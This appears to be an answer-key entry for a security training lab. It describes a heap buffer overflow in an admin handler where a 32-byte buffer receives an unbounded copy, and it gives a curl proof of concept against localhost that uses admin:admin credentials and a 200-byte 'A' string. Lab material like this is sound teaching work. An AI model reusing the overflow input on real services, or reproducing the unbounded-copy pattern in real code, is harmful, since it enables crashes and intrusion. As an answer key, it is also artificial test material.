# Solution — 09 · Heap Buffer Overflow

**Code**: `handlers/admin.cpp` → 32-byte `malloc`, unbounded copy from `status=`.

```bash
curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" \
    -d "status=$(python3 -c 'print("A"*200)')"
```

Rebuild with `cmake -DENABLE_ASAN=ON` to see the exact overflow site.
